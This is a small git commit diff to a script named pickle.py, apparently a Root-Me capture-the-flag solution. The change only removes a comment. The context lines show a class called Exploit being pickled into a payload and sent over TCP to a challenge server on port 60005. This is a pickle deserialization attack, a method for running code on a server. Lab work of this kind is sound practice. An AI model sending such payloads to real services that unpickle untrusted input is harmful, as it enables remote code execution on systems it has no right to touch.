dbc27faf89888b94061d9b4a83df69ff626fab40
rstride <romain.stride@gmail.com>
2024-08-14 16:13:24 +0200

    Editing pickle

--- scripts/pickle.py
+++ scripts/pickle.py
@@ -7,7 +7,6 @@ class Exploit(object):
 
 payload = pickle.dumps(Exploit())
 
-# Send payload over TCP
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('challenge02.root-me.org', 60005))
 s.send(payload)
